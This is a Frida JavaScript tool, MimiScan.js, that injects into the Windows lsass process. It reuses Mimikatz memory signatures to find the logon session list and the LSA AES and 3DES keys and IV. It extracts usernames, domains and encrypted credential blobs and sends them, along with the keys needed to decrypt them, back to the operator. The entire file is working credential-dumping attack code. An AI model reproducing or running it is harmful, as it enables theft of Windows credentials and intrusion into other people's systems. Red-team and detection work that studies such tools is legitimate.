/*
* MimiScan.js
* Using hardcoded signatures taken from Mimikatz, scan lsass memory for credential material, decrypt it and dump it.
* Changes to the memory layout of lsass may require new signatures and offsets to be calculated.
*/

function findDereferencedAddress(ptr) {
	// Given a pointer to a RIP-relative LEA instruction, extract the address that the instruction dereferences.
	// This is used to identify the location of global variables in lsass memory by finding instructions that dereference them. 
	// Target instruction should look something like this:
	// <signature> + <offset>: lea rcx, [rip + 0x118061]

	var targetInstruction = Instruction.parse(ptr);
	// Sanity check for the presence of the LEA mnemonic.
	if (targetInstruction.mnemonic !== "lea") {
		return null;
	}
	// The second operand of the instruction is the RIP-relative address (i.e. "[rip + 0x118061]").
	var operand = targetInstruction.operands[1];
	// Sanity check to make sure it's a RIP-relative offset, not relative to some other register.
	if (operand["value"]["base"] !== "rip") {
		return null;
	}
	// Get the offset.
	var ripOffsetInt = operand["value"]["disp"];
	var ripOffset = new NativePointer(ripOffsetInt);
	// Finally, we need to convert the offset into an actual address.
	// To do this, find what RIP will be just after our target instruction, then add the offset.
	var rip = targetInstruction.next;
	var target = rip.add(ripOffset);
	return target;
}

//lsasrv!LogonSessionList parsing

function getLogonSessions(ptr, max) {
	// Given a pointer to lsasrv!LogonSessionList, enumerate the address of all logon sessions that it contains.
	// LogonSessionList is a simple linked list, so the first element of each entry is a pointer to the next one.
	var sessions = [];
	var current = ptr;
	
	for (var i = 0; i < max; i++) {
		sessions.push(current.toString());
		current = current.readPointer();
		if (sessions.includes( current.toString() )) {
			i = max
		}
	}
	
	return sessions;
}

function getUsernameFromLogonSession(ptr) {
	// Given a pointer to a LogonSession, extract the username (a UNICODE_STRING).
	var usernamePtr = ptr.add(0x90);
	var len = usernamePtr.readUShort();
	var usernameBuffer = usernamePtr.add(0x8).readPointer();
	var username = usernameBuffer.readUtf16String(len);
	return username;
	
}

function getDomainFromLogonSession(ptr) {
	// Given a pointer to a LogonSession, extract the domain (a UNICODE_STRING).
	var domainPtr = ptr.add(0xa0);
	var len = domainPtr.readUShort();
	var domainBuffer = domainPtr.add(0x8).readPointer();
	var domain = domainBuffer.readUtf16String(len);
	return domain;
}

function getPrimaryCredentialsFromLogonSession(ptr) {
	// Given a pointer to a LogonSession, extract the encrypted credentials blob.
	var credentialsPtr = ptr.add(0x108).readPointer();
	
	// The credentials pointer can be null, in which case we should abort.
	if (credentialsPtr.toString() == "0x0") {
		return null;
	}
	
	// The credentials pointer points to a struct that gentilkiwi calls _KIWI_MSV1_0_CREDENTIALS.
	// This struct, in turn, contains a pointer to the actual "primary credentials" object at offset 0x10.
	var primaryCredentialsPtr = credentialsPtr.add(0x10).readPointer();
	
	// Within the "primary credentials" object (AKA _KIWI_MSV1_0_PRIMARY_CREDENTIALS), the actual encrypted blob is located at offset 0x18.
	var cryptoblobPtr = primaryCredentialsPtr.add(0x18);
	// It's a UNICODE_STRING so we need to parse it to find the correct size and read the cryptoblob.
	var cryptoblobLen = cryptoblobPtr.readUShort();
	var cryptoblobBuffer = cryptoblobPtr.add(0x8).readPointer();
	var cryptoblob = cryptoblobBuffer.readByteArray(cryptoblobLen);
	return cryptoblob;
}

//lsasrv!hAesKey and lsasrv!h3DesKey parsing

function getKey(ptr) {
	// Given a pointer to the lsasrv!hAesKey or lsasrv!h3DesKey variable, extract the actual AES/3DES key.
	// Returns a ByteArray containing the key.
	
	// First, resolve the pointer to get the BCRYPT_HANDLE_KEY struct it references.
	var bcryptHandleKey = ptr.readPointer();
	// Next, locate the pointer to BCRYPT_KEY located at offset 0x10.
	var bcryptKey = bcryptHandleKey.add(0x10).readPointer();
	// Within BCRYPT_KEY, the HARD_KEY field is located at 0x38.
	var hardKey = bcryptKey.add(0x38);
	// The first entry in HARD_KEY is a ULONG containing the key length.
	var len = hardKey.readULong();
	// The second entry (at offset 0x4) is the actual key.
	var keyBuffer = hardKey.add(0x4);
	var key = keyBuffer.readByteArray(len);
	return key;
}

function getAesIV(ptr) {
	// Given a pointer to the AES IV variable, extract the actual AES key.
	// Returns a ByteArray containing the IV.
	return ptr.readByteArray(16);
}


// main()


var lsasrv = Process.getModuleByName("lsasrv.dll")

// signatures from mimikatz, version dependent
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
var WLsaEnumerateLogonSession = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; 
var LsaInitializeProtectedMemory = "83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15"; 

// Offsets:
// WLsaEnumerateLogonSession Signature + 0x14 = lsasrv!LogonSessionList
// LsaInitializeProtectedMemory Signature + 0xD = lsasrv!hAesKey
// LsaInitializeProtectedMemory Signature - 0x5C = lsasrv!h3DesKey
// LsaInitializeProtectedMemory Signature + 0x40 = IV for AES Key

// scanning for WLsaEnumerateLogonSession(), used to identify lsasrv!LogonSessionList
Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
	onMatch(signature, size) {
		var lea = signature.add(0x14);
		var logonSessionList = findDereferencedAddress(lea);
		var sessions = getLogonSessions(logonSessionList, 100);
		
		for (var s of sessions) {
			var ptr = new NativePointer(s);
			var username = getUsernameFromLogonSession(ptr);
			var domain = getDomainFromLogonSession(ptr);
			var pc = getPrimaryCredentialsFromLogonSession(ptr);
			var output = {
				"type": "credentials",
				"username": username,
				"domain": domain
			}
			if (pc != null) {
				send(output, pc);
			}
		}
	}
});

// scanning for LsaInitializeProtectedMemory(), used to identify lsasrv!hAesKey and lsasrv!h3DesKey
Memory.scan(lsasrv.base, lsasrv.size, LsaInitializeProtectedMemory, {
	onMatch(signature, size) {
		var lea = signature.add(0xD);
		var aesKeyPtr = findDereferencedAddress(lea);
		var aesKey = getKey(aesKeyPtr);
		var output  = { "type": "aeskey" }
		send(output, aesKey);

		lea = signature.add(-0x5C);
		var desKeyPtr = findDereferencedAddress(lea);
		var desKey = getKey(desKeyPtr);
		output = { "type": "3deskey" }
		send(output, desKey);
		
		lea = signature.add(0x40);
		var aesIVPtr = findDereferencedAddress(lea);
		var aesIV = getAesIV(aesIVPtr);
		output = { "type": "aes_iv" }
		send(output, aesIV);
	}
});

